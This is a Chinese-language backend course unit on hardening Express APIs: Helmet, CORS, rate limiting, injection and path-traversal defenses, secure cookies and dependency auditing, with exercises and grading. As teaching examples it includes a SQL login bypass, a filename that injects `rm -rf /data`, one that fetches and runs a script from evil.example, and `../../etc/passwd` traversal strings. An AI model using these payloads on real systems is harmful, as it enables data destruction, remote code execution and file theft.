# 48-API 安全：Helmet、限流与依赖治理

## 目标

完成本知识单元后，学员应能为后端服务补齐网络边界、注入防御、会话载体和供应链四个维度的安全基线，并形成一份可持续执行的上线安全清单。

学员应能够：

1. 解释 Helmet 设置的主要安全响应头各自防御什么风险，能按业务需要调整策略。
2. 在后端正确配置 CORS，区分浏览器同源策略与服务端访问控制，安全处理携带凭证的跨域请求。
3. 使用限流中间件保护登录、敏感写接口与全局 API，正确处理 429 与重试。
4. 解释 SQL 注入、命令注入、路径遍历的原理，能用参数化查询/ORM、安全进程调用、路径归一化校验分别防御。
5. 正确配置安全 Cookie 属性，理解各属性与 XSS、CSRF、中间人攻击的关系。
6. 使用依赖审计工具识别已知漏洞，管好敏感配置，并按安全清单完成上线前自检。

本单元是认证授权与输入校验之外的“外围与纵深”防线。密码哈希/JWT 细节见第 45 单元，越权防护见第 46 单元，校验与异常见第 47 单元。

## 技术栈

| 工具或依赖 | 当前稳定版本参考 | 用途 | 学习要求 |
|---|---|---|---|
| Node.js | 22 LTS / 24 LTS | 后端运行时 | 理解子进程与文件系统 API |
| Express | 4.x（5.x 已发布） | 服务框架 | 能按顺序注册安全中间件 |
| `helmet` | 7.x / 8.x | 安全响应头集合 | 知道默认头与定制方式 |
| `cors` | 2.8.x | CORS 中间件 | 能配置来源白名单与凭证 |
| `express-rate-limit` | 7.x | 请求限流 | 能对不同路由设置不同策略 |
| 数据库驱动或 ORM | pg 8.x / Prisma 5.x 等 | 参数化访问 | 坚持占位参数，不拼 SQL |
| 审计工具 | `npm audit`、osv-scanner、Renovate/Dependabot | 依赖漏洞治理 | 能读懂报告并分级处置 |

安装示例：

```bash
npm install helmet cors express-rate-limit
```

中间件推荐注册顺序（安全中间件尽量靠前）：

```text
1. helmet()                 # 先加安全头
2. cors(options)            # 来源控制
3. rateLimit(...)           # 限流
4. body parser（限制体积）
5. 路由
6. 全局错误中间件
```

## 详细的理论知识讲解和示例伪代码

### 1. Helmet 安全响应头

#### 定义

Helmet 是一个 Express 中间件集合，它通过设置一组 HTTP 响应头来降低常见攻击面。它本身不“拦截攻击”，而是告诉浏览器按更安全的方式处理页面。主要响应头：

| 响应头 | 防御目标 |
|---|---|
| `Content-Security-Policy` | 限制脚本、样式、图片来源，缓解 XSS |
| `X-Content-Type-Options: nosniff` | 阻止浏览器 MIME 嗅探，防类型伪装 |
| `X-Frame-Options` / CSP `frame-ancestors` | 防止页面被嵌套进 iframe 实施点击劫持 |
| `Strict-Transport-Security` | 强制浏览器后续走 HTTPS |
| `Referrer-Policy` | 控制 Referer 泄露，避免带出敏感路径与参数 |
| `X-DNS-Prefetch-Control` | 控制 DNS 预取行为 |

#### 与后端的关系

安全头必须在每个响应上都存在，最可靠的方式是在应用最前面统一注册，而不是逐路由设置。CSP 需要结合前端资源来源定制，过严会白屏，应先以只报告模式观察再转强制。

#### 示例

```js
import express from 'express';
import helmet from 'helmet';

const app = express();

app.use(
  helmet({
    contentSecurityPolicy: {
      useDefaults: true,
      directives: {
        'default-src': ["'self'"],
        'script-src': ["'self'", 'https://trusted-cdn.example.com'],
        'img-src': ["'self'", 'data:', 'https:'],
        'object-src': ["'none'"],
      },
    },
    // 纯 API 服务可直接关闭只对 HTML 有意义的策略
    frameguard: { action: 'deny' },
    strictTransportSecurity: {
      maxAge: 63072000, // 两年
      includeSubDomains: true,
      preload: true,
    },
  })
);
```

```text
纯 API 服务的最小认知：
helmet() 默认值即可，不需要复杂 CSP（返回 JSON、不渲染 HTML）
浏览器型服务：必须花时间调 CSP，先 Content-Security-Policy-Report-Only 观察
```

验证响应头：

```bash
curl -I http://localhost:3000/api/health
# 预期能看到 x-content-type-options、strict-transport-security 等头
```

#### 常见误区

> 装了 Helmet 就不会被 XSS。

Helmet 的 CSP 能显著限制 XSS 后果，但仍需对输出做转义、对输入做校验，属于纵深防御的一层。

> HSTS 随便开，大不了用户访问不了。

`max-age` 设置过大且站点尚未全量 HTTPS 时会造成长期访问问题；应先短时验证，确认全站 HTTPS 后再拉长。

### 2. 后端 CORS 配置

#### 定义

CORS（跨源资源共享）是浏览器执行的同源策略的放行机制：服务端通过 `Access-Control-Allow-Origin` 等响应头声明允许哪些来源、方法和头跨源读取响应。关键点：CORS 限制的是浏览器页面里的脚本，服务端与服务端之间用任意 HTTP 客户端请求并不受 CORS 限制；攻击者在自己的机器上直接调你的接口也不受 CORS 阻挡，所以它不是访问控制手段。

携带凭证（Cookie、Authorization 自动携带等）时规则更严格：`Access-Control-Allow-Origin` 不能是 `*`，必须回显具体来源，同时要显式返回 `Access-Control-Allow-Credentials: true`。

#### 与后端的关系

后端应维护可信来源白名单，按请求 `Origin` 动态决定是否放行；对会触发预检的方法（如带自定义头的 POST、PUT、DELETE）正确响应 `OPTIONS`，并通过 `Access-Control-Max-Age` 减少预检频率。

#### 示例

```js
import cors from 'cors';

const allowlist = new Set([
  'https://app.example.com',
  'https://admin.example.com',
]);

app.use(
  cors({
    origin(origin, callback) {
      // 同源请求、curl 等没有 Origin；按业务决定是否放行无来源请求
      if (!origin || allowlist.has(origin)) return callback(null, true);
      return callback(new Error('CORS blocked'), false);
    },
    methods: ['GET', 'POST', 'PATCH', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization'],
    credentials: true, // 此时不能用 origin: '*'
    maxAge: 600,
  })
);
```

```text
预检链路：
浏览器先 OPTIONS /api/orders（Access-Control-Request-Method: DELETE）
服务端回：允许的方法、头、缓存时间
浏览器核对通过后才发真正的 DELETE
开发代理（dev server proxy）是换同源的工程技巧，不能替代线上 CORS 配置
```

#### 常见误区

> 在前端请求里加 `Access-Control-Allow-Origin` 头来修复报错。

这是响应头，由服务端下发；请求里加它没有任何意义。

> 为了方便，直接 `origin: '*'` 且 `credentials: true`。

浏览器会直接拒绝这种组合，且对所有来源放开凭证等于放弃来源控制。

### 3. 限流

#### 定义

限流（Rate Limiting）限制单个客户端在固定时间窗口内的请求次数，用于缓解暴力破解、撞库、接口滥用和拒绝服务。被限流时返回 429 Too Many Requests，并通过 `Retry-After` 头告知等待时间。合理限流同时保护可用性与成本（防止被刷接口产生高额数据库与第三方调用费用）。

常见策略：登录等敏感接口按 IP + 账号做严格限制（如 15 分钟 5 次失败尝试）；普通 API 按 IP 或用户做较宽松限制；多实例部署需要共享存储（如 Redis）计数，否则每台机器各自计数会让上限翻倍。

#### 与后端的关系

限流要尽量前置，在昂贵的业务与数据库操作之前挡住超额流量；但要注意 IP 头（`X-Forwarded-For`）可被伪造，需要信任正确层数的代理头，否则攻击者可伪造 IP 绕过，或误伤共享出口下的大量正常用户。

#### 示例

```js
import rateLimit from 'express-rate-limit';

const globalLimiter = rateLimit({
  windowMs: 60 * 1000,
  limit: 120,                 // 每分钟每客户端 120 次
  standardHeaders: 'draft-7', // 使用标准 RateLimit 头
  legacyHeaders: false,
  message: { error: { code: 'RATE_LIMITED', message: '请求过于频繁，请稍后再试' } },
});

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  limit: 10, // 登录窗口收紧
  skipSuccessfulRequests: true, // 只统计失败尝试
  message: { error: { code: 'TOO_MANY_ATTEMPTS', message: '尝试次数过多，请 15 分钟后再试' } },
});

app.use('/api/', globalLimiter);
app.use('/api/login', loginLimiter);
```

```text
响应头（客户端可据此自适应）：
RateLimit-Limit: 120
RateLimit-Remaining: 87
RateLimit-Reset: 60
超限：HTTP 429 + Retry-After
客户端正确做法：读 Retry-After 退避重试，而非立即反复点
```

#### 常见误区

> 限流只在前端做倒计时。

攻击者不经过前端，直接打接口即可绕过；服务端限流才是实际闸门。

> 只按 IP 限流就万无一失。

分布式攻击每 IP 次数很低；敏感操作还应叠加账号维度、验证码与异常检测。

### 4. SQL 注入与参数化查询/ORM

#### 定义

SQL 注入指攻击者把输入中的内容拼接进 SQL 语句，改变语句结构，从而绕过认证、读取或篡改任意数据。经典例子是登录条件拼接：

```text
拼接：SELECT * FROM users WHERE name = '" + name + "' AND password = '" + pwd + "'
输入 name = admin' -- 之后语句变成：
SELECT * FROM users WHERE name = 'admin' --' AND password = '...'
密码校验被注释掉，直接以 admin 身份通过
```

参数化查询（预编译语句）把 SQL 结构与参数严格分离：SQL 中用占位符（`$1`、`?`、命名参数），参数仅作为值绑定，永远不会被解释为 SQL 关键字或结构。ORM 在底层默认使用参数绑定，同样安全，但使用原生 SQL 拼接方法时仍会踩坑。

#### 与后端的关系

安全基线：禁止用字符串拼接任何含外部输入的 SQL；动态排序字段、表名等不能参数化的部分，用白名单映射；数据库账号最小权限，避免应用账号具备删表或访问无关库的能力。

#### 示例

```ts
// 危险：字符串拼接（示意，禁止使用）
// pool.query(`SELECT * FROM users WHERE email = '${email}'`);

// 安全：参数占位，值与结构分离
export async function findUserByEmail(email: string) {
  const result = await pool.query('SELECT id, email FROM users WHERE email = $1', [email]);
  return result.rows[0] ?? null;
}

// 不能参数化的 ORDER BY 列：白名单映射
const SORT_COLUMNS: Record<string, string> = {
  newest: 'created_at DESC',
  oldest: 'created_at ASC',
};

export function listArticles(sort = 'newest') {
  const order = SORT_COLUMNS[sort] ?? SORT_COLUMNS.newest; // 绝不直接拼入 sort
  return pool.query(`SELECT id, title FROM articles ORDER BY ${order}`);
}
```

```js
// ORM 写法（以 Prisma 风格示意）：值自动参数化
const user = await prisma.user.findUnique({ where: { email } });
// 即使要用原始查询，也必须走参数绑定：
prisma.$queryRaw`SELECT * FROM users WHERE email = ${email}`; // 模板标签会自动绑定
```

#### 常见误区

> 用了 ORM 就绝对不会注入。

ORM 提供拼接原生 SQL 的逃生口，滥用字符串拼接同样注入；转义函数也不能替代参数化。

> 我的输入做了“引号替换”就安全。

黑名单转义会遗漏编码、数字型注入、注释符等大量情形；唯一可靠基线是参数绑定。

### 5. 命令注入

#### 定义

命令注入指后端把外部输入拼进系统命令，攻击者通过 shell 元字符（`;`、`&&`、`|`、反引号、`$()`）追加任意命令。例如文件名参数被拼进 `ls`：

```text
命令：ls [input]
输入：report.pdf; rm -rf /data
执行：ls report.pdf; rm -rf /data   # 第二条命令被执行
```

#### 与后端的关系

Node.js 中 `child_process.exec` 会启动 shell 解释字符串，风险最高；应优先使用 `execFile`/`spawn` 并以数组传参，参数不经 shell 解释，元字符只会被当作普通字符。更进一步，能用内置库完成的功能就不要起子进程（如用 `fs` 替代 `ls`，用压缩库替代 shell 命令）。

#### 示例

```js
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';

const execFileAsync = promisify(execFile);

// 安全：命令固定，参数数组化，不经过 shell
async function inspectPdf(filename) {
  // filename 仍需校验为预期格式，形成纵深
  if (!/^[\w.-]+\.pdf$/.test(filename)) {
    throw new AppError('INVALID_FILENAME', 422, '文件名不合法');
  }
  const { stdout } = await execFileAsync('pdfinfo', [filename], { shell: false });
  return stdout;
}
```

```text
风险对照：
exec(`pdfinfo ${filename}`)           # 有 shell，输入可注入
execFile('pdfinfo', [filename])       # 无 shell，参数原样传递
优先顺序：内置 API > 专用库 > execFile/spawn 数组参数 > 永远不要 exec(拼接字符串)
```

#### 常见误区

> 对输入做字符过滤就能安全使用 exec。

shell 语法随平台和命令变化，过滤极易遗漏；正确做法是不经过 shell，而不是和元字符斗智。

> 命令注入需要登录，所以危害有限。

结合越权、注入链可实现未授权远程命令执行，是最高危漏洞之一，必须从调用方式上根除。

### 6. 路径遍历与文件安全

#### 定义

路径遍历指攻击者在文件路径参数中使用 `../`（或绝对路径、URL 编码变体）跳出受限目录，读取服务器任意文件，如 `/etc/passwd`、配置文件、密钥文件。典型代码是直接拼接用户输入的文件名：

```text
请求：/files?name=../../etc/passwd
拼接：/var/app/uploads/../../etc/passwd  -> 解析为 /etc/passwd
```

防御要点：拼接后用 `path.resolve` 归一化得到绝对路径，再校验它仍以允许目录为前缀；文件名单独做白名单字符校验；对下载接口设置正确 Content-Type 与 `Content-Disposition`，避免 HTML 文件被当页面渲染引发存储型 XSS。

#### 与后端的关系

文件上传还要限制：大小上限、允许类型（校验内容而非仅扩展名）、随机化存储名、上传目录不具备执行权限、不与代码同目录。文件类功能历来是入侵重灾区，应默认从严。

#### 示例

```ts
import { createReadStream } from 'node:fs';
import { resolve, sep, basename } from 'node:path';
import type { Request, Response } from 'express';

const UPLOAD_DIR = resolve(process.cwd(), 'uploads');

export function download(req: Request, res: Response) {
  const raw = String(req.query.name ?? '');
  // 只取 basename，先剥掉任何目录部分
  const candidate = resolve(UPLOAD_DIR, basename(raw));

  // 归一化后必须仍在 UPLOAD_DIR 内
  if (candidate !== UPLOAD_DIR && !candidate.startsWith(UPLOAD_DIR + sep)) {
    return res.status(403).json({ error: { code: 'FORBIDDEN', message: '非法路径' } });
  }

  res.setHeader('Content-Disposition', `attachment; filename="${basename(candidate)}"`);
  createReadStream(candidate).pipe(res);
}
```

```text
校验顺序不能反：
1. basename/白名单清洗
2. resolve 归一化为绝对路径
3. startsWith(允许目录 + sep) 前缀校验
只比较字符串而不归一化，会被 /a/../b、编码变体绕过
```

#### 常见误区

> 过滤掉输入中的 `../` 就安全。

存在 `....//`、URL 编码 `%2e%2e%2f`、绝对路径等绕过；归一化前缀校验才可靠。

> 信任上传文件的扩展名。

扩展名可任意伪造，图片马（伪装成图片的脚本）需要内容校验，且存储目录禁止脚本执行。

### 7. 安全 Cookie

#### 定义

Cookie 是浏览器随请求自动携带的小型数据，也是会话令牌的常见载体。其安全属性共同构成防御：

| 属性 | 作用 | 缺失风险 |
|---|---|---|
| `HttpOnly` | 禁止 JavaScript 读取 | XSS 可直接偷走会话 |
| `Secure` | 仅经 HTTPS 发送 | 明文网络下可被嗅探 |
| `SameSite`（Strict/Lax/None） | 限制跨站请求携带 | 跨站伪造请求（CSRF） |
| `Path` / `Domain` | 限定发送范围 | 范围过大被更多接口携带 |
| `Max-Age` / 持久化 | 控制有效期 | 永久 Cookie 风险累积 |

使用 `SameSite=None` 时必须同时 `Secure`。CSRF 的额外缓解包括同步令牌（CSRF Token）、对敏感状态修改使用自定义请求头并校验来源（Origin/Referer）、关键操作二次确认。

#### 与后端的关系

后端在下发会话或刷新令牌 Cookie 时统一设置属性；生产环境强制 Secure，本地 HTTP 开发再降级；注销时立即清除 Cookie 并使服务端会话失效。

#### 示例

```js
function setSessionCookie(res, name, value) {
  res.cookie(name, value, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    path: '/',
    maxAge: 7 * 24 * 60 * 60 * 1000,
  });
}

// 清除时属性要与设置时一致，否则浏览器可能删不掉
function clearSessionCookie(res, name) {
  res.clearCookie(name, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    path: '/',
  });
}
```

```text
XSS 与 CSRF 的分工理解：
HttpOnly 让 XSS 偷不到 Cookie，但 XSS 仍可在页面内做坏事 -> 还要 CSP、输出转义
SameSite 让其他网站发请求时不自动带 Cookie -> 缓解 CSRF，但同一站点内的漏洞不受影响
安全是多属性叠加，没有单一开关
```

#### 常见误区

> 设置了 HttpOnly 就不会有 XSS。

HttpOnly 只保护 Cookie 不被脚本读取，不阻止 XSS 本身。

> SameSite=Lax 等于完整 CSRF 防御。

顶层导航的 GET 仍会携带 Cookie，且不应通过 GET 执行状态修改；高安全场景仍需 CSRF Token。

### 8. 依赖审计、敏感配置与安全清单

#### 定义

现代应用绝大部分代码来自第三方依赖，依赖中的已知漏洞会被沿供应链继承。依赖治理包括：用 `npm audit`、osv-scanner 等比对已知漏洞库；在 CI 中设门禁；用 Dependabot/Renovate 自动提升级；锁定锁文件与完整性校验；新增依赖前评估维护活跃度与体积；对高危漏洞快速升级或替换。

敏感配置管理：Secret 只通过环境变量或密钥管理服务注入，不入库、不进日志；提交物用 `.env.example` 占位；区分开发/测试/生产配置；定期轮换密钥；启动时校验必需配置是否存在。

#### 与后端的关系

安全不是一次性动作而是持续流程：审计、升级、最小权限、备份与回归测试应进入日常迭代，而不是上线前夜突击。

#### 示例

```bash
# 本地审计：查看已知漏洞与建议
npm audit

# 只查生产依赖的高危项
npm audit --omit=dev --audit-level=high

# CI 中可作为门禁（按团队策略选择级别）
npm audit --audit-level=high --production

# 校验锁文件与安装完整性
npm ci
```

```js
// 启动前配置校验：缺关键 Secret 直接拒绝启动
const REQUIRED = ['JWT_ACCESS_SECRET', 'JWT_REFRESH_SECRET', 'DATABASE_URL'];

for (const key of REQUIRED) {
  if (!process.env[key]) {
    // 启动失败属于显式失败，不能用默认弱值继续运行
    console.error(`missing required environment variable: ${key}`);
    process.exit(1);
  }
}
```

```text
上线安全清单（可直接贴进发布单逐项勾选）：
[ ] 全站 HTTPS，HSTS 已验证
[ ] Helmet 安全头存在，CSP 已在真实页面验证
[ ] CORS 为来源白名单，凭证组合正确
[ ] 登录与敏感接口有限流，429 有退避
[ ] 全部 SQL 使用参数化，无字符串拼接
[ ] 无 exec 拼接；文件路径有归一化前缀校验
[ ] Cookie 含 HttpOnly/Secure/SameSite
[ ] npm audit 无未处置高危；锁文件已更新
[ ] Secret 走环境变量/密钥服务，.env 未入库
[ ] 错误响应不含堆栈与内部细节
[ ] 日志脱敏，访问权限受控
[ ] 数据库与进程账号最小权限
[ ] 关键越权场景已回归测试
```

#### 常见误区

> `npm audit` 零告警才算合格。

应按可利用性与影响分级处置：开发依赖、不可达代码路径的低危项可记录后排期，但高危且可被利用的项必须处置，不能用“一直都这样”忽略。

> Secret 放在私有仓库就安全。

仓库权限会变化、历史提交长期保留、克隆会扩散；Secret 不应进入代码仓库，一旦进入按泄露处理并轮换。

## 课后题

1. Helmet 主要通过什么机制发挥作用？请说出三个响应头及其防御目标。
2. CSP 过严和过松分别有什么后果？为什么推荐先使用只报告模式？
3. 为什么说 CORS 不是访问控制手段？服务端之间的调用受 CORS 限制吗？
4. 携带凭证的跨域请求有哪些必须满足的条件？为什么 `origin:'*' + credentials:true` 无效？
5. 限流为什么要放在业务处理之前？多实例部署时单机计数有什么问题？
6. 用 `admin' --` 这个输入讲清 SQL 注入如何绕过登录，以及参数化查询为什么能挡住它。
7. 场景分析：某头像处理接口把用户提交的文件名直接传入 `exec('convert ' + file + ' thumb.png')`，攻击者上传名为 `x.png; curl https://evil.example/x.sh | sh; echo .png` 的文件。请还原攻击执行链，用 `execFile` 数组参数给出修复，并解释为什么元字符不再生效。
8. 场景分析：某下载接口 `?file=` 参数直接拼路径，攻击者传入 `%2e%2e%2f%2e%2e%2fetc%2fpasswd`。给出攻击原理与三段式修复代码思路。
9. 场景分析：安全团队发现 CORS 配成了反射任意 Origin 且允许凭证。攻击者能做什么？请给出白名单改法。
10. 场景分析：`npm audit` 报告一个出现在深层生产依赖中的高危漏洞，但该功能路径当前未被任何接口调用。你会如何决策处置，并说明理由。

## 实践练习题

### 练习 1：Helmet、CORS 与限流加固

#### 任务

为一个 Express API 补齐安全头、来源白名单与分层限流，并验证响应头与 429 行为。

#### 步骤约束

1. 注册 Helmet 并定制 CSP（纯 API 可用默认策略）；用 curl 验证至少四个安全头存在。
2. 用 `cors` 实现两个可信来源的白名单与凭证支持；非白名单来源被拒，预检 OPTIONS 正常。
3. 配置全局每分钟 120 次与登录接口 15 分钟 10 次失败尝试的限流；超限返回 429 与标准限流头。
4. 编写脚本快速打满登录限流，记录 429 与 `RateLimit-*` 头。
5. 说明在反向代理后应如何正确取得客户端 IP（信任代理层数）。

#### 提交物

- 服务代码；
- 安全头与 CORS 的请求/响应证据；
- 触发限流前后的记录；
- 200 字以内的“代理与真实 IP”说明。

#### 验收标准

- 每个响应都带安全头；
- 非白名单 Origin 无法通过，白名单内携带凭证可用；
- 429 响应结构统一、可退避；
- 限流对成功登录不计数，只统计失败；
- 不通过关闭中间件制造演示。

### 练习 2：注入与路径遍历防护

#### 任务

对用户查询、图片处理和文件下载三个功能分别做 SQL 注入、命令注入、路径遍历的攻防演练。

#### 步骤约束

1. 用户查询改为参数化；用 `admin' --` 等注入串验证无法绕过登录；动态排序字段走白名单。
2. 图片处理若需调用外部程序，改为 `execFile` 数组参数；构造含 `;id` 的文件名验证不被执行。
3. 文件下载实现 basename 清洗 + resolve 归一化 + 前缀校验；用 `../../etc/passwd` 及其编码变体验证被拒。
4. 为三类攻击各写至少两个攻击输入的自动化用例。
5. 在报告中按“攻击输入—错误写法—修复后表现”整理。

#### 提交物

- 三个功能的代码；
- 攻防测试与结果；
- 攻击演练报告；
- 一份“为什么过滤黑名单不可靠”的小结。

#### 验收标准

- 三种注入均无法成功，且用例覆盖编码变体；
- SQL 全部参数化，无拼接外部输入；
- 不经过 shell 调用外部程序；
- 路径校验在归一化之后进行；
- 修复不改变合法功能的正常行为。

### 练习 3：安全 Cookie 与依赖治理流水线

#### 任务

统一安全 Cookie 配置，建立依赖审计门禁，并产出一份项目专属上线安全清单。

#### 步骤约束

1. 封装安全 Cookie 设置/清除工具：HttpOnly、生产 Secure、SameSite=Lax、限定 Path；注销时正确清除。
2. 运行 `npm audit`，把结果按“高危可利用/高危不可达/中低危”分级，给出升级或排期记录。
3. 在项目中加入一条审计脚本（如 `npm run audit:high`），并说明如何在 CI 中作为门禁。
4. 实现启动时必需环境变量校验，缺失即拒绝启动；提供只含占位符的 `.env.example`。
5. 结合本单元清单与项目实际，裁剪出不少于 10 项的发布安全清单并逐项标注证据位置。

#### 提交物

- Cookie 工具与配置校验代码；
- 依赖审计分级记录与脚本；
- `.env.example`；
- 项目发布安全清单（含证据链接）。

#### 验收标准

- Cookie 属性在设置与清除时一致；
- 审计分级有处置结论而非空泛记录；
- 缺少关键配置时服务无法启动；
- 提交物中无真实 Secret；
- 安全清单每项都能找到实际证据。

## 阶段验收作业

### 作业名称

API 安全加固与上线安全评审

### 作业场景

一个即将上线的 Node.js 服务缺少外围防护：没有安全头、CORS 全开、登录可被暴力尝试、存在 SQL 拼接与文件路径拼接、依赖与密钥管理混乱。你需要完成系统性加固，并通过攻防演示、审计报告与安全清单向评审委员会证明服务具备上线安全基线。

### 提交物

```text
secure-api/
├── src/
│   ├── middleware/
│   │   ├── security.js       # Helmet、CORS、限流
│   │   ├── cookies.js        # 安全 Cookie
│   │   └── config.js         # 启动配置校验
│   ├── modules/
│   │   ├── users/            # 参数化查询
│   │   ├── files/            # 安全下载
│   │   └── media/            # 安全子进程
│   └── server.js
├── test/
│   └── security.test.js      # 注入/越界/头与限流
├── docs/
│   ├── audit-report.md       # 依赖审计分级
│   └── release-checklist.md  # 上线安全清单
├── .env.example
└── README.md
```

### 演示步骤

学员需在 20 分钟内完成：

1. 用 curl 展示 Helmet 安全头与 HSTS，说明 CSP 策略来源。
2. 用白名单内外两个 Origin 演示 CORS 放行与拒绝，并展示一次预检 OPTIONS。
3. 快速打满登录限流，展示 429、限流头与退避方式。
4. 提交 SQL 注入串与路径遍历串，展示均被参数化与路径校验挡住。
5. 展示含 shell 元字符的文件参数不被执行；安全 Cookie 属性在响应中可见。
6. 展示 `npm audit` 分级结果、CI 审计门禁与缺失配置拒绝启动。
7. 逐项讲解 release-checklist.md 中每项的证据位置，回答导师随机提问。

### 评分标准

总分 100 分，70 分及以上通过。

| 维度 | 分值 | 满分要求 |
|---|---:|---|
| Helmet 与安全头 | 15 | 安全头齐全，CSP/HSTS 经过验证，定制合理 |
| CORS | 15 | 白名单正确，凭证组合合法，预检可用 |
| 限流 | 15 | 分层策略生效，429 标准头，登录防暴力 |
| 注入防御 | 20 | SQL 参数化、子进程无 shell、路径归一化校验，测试齐全 |
| 安全 Cookie | 10 | 三属性正确，清除一致，能解释与 XSS/CSRF 关系 |
| 依赖与配置治理 | 15 | 审计分级有结论，CI 门禁，Secret 不入库，启动校验 |
| 证据与清单 | 10 | 攻防证据完整，清单可执行，README 可复现 |

细分规则：

- Helmet：头齐全 8 分；CSP/HSTS 合理 7 分。
- CORS：白名单 8 分；凭证与预检 7 分。
- 限流：分层策略 8 分；429 与头部 7 分。
- 注入防御：SQL 7 分；命令 6 分；路径 7 分。
- 安全 Cookie：属性 6 分；清除与解释 4 分。
- 依赖与配置：审计 6 分；门禁与 Secret 5 分；启动校验 4 分。
- 证据与清单：演练 5 分；清单可执行 5 分。

### 强制不通过条件

出现以下任一情况，本次验收不通过：

1. 存在可成功利用的 SQL 注入、命令注入或路径遍历。
2. CORS 对任意来源反射并允许携带凭证。
3. 登录等敏感接口完全无限流，可被无限制暴力尝试。
4. 响应缺少基本安全头，或 Cookie 未设置 HttpOnly/Secure（生产）/SameSite。
5. 提交真实 Secret，或密钥硬编码入库；高危可利用依赖漏洞未处置。
6. 安全清单无实际证据支撑，或服务无法按 README 在评审环境运行。
7. 只提交截图，没有可运行代码、测试与攻防记录。

### 学习目标与验收映射

| 学习目标 | 验收证据 |
|---|---|
| 掌握 Helmet 安全头 | security.js、curl 头证据与现场解释 |
| 正确配置后端 CORS | 白名单/预检/凭证三组演示 |
| 实施限流 | 登录与全局限流的 429 证据 |
| 防御 SQL/命令注入 | 参数化代码、execFile 用例与攻击记录 |
| 防御路径遍历 | files 模块与编码变体测试 |
| 配置安全 Cookie | cookies.js 与响应属性证据 |
| 依赖审计与配置治理 | audit-report.md、CI 门禁与 .env.example |
| 执行上线安全清单 | release-checklist.md 逐项证据 |

### 提交前自检

- [ ] 七个学习目标均有对应证据。
- [ ] 安全中间件注册顺序正确，每个响应都带头。
- [ ] CORS 白名单与凭证组合经过真实跨域页面验证。
- [ ] 全局与敏感接口限流均生效且可退避。
- [ ] 全库检索不到拼接外部输入的 SQL 与 exec 字符串。
- [ ] 文件下载归一化前缀校验覆盖编码变体。
- [ ] Cookie 三属性在设置与清除时一致。
- [ ] 高危可利用依赖已处置，Secret 全部来自环境变量或密钥服务。
- [ ] 发布清单每项证据可点开核对，README 可指导复现。
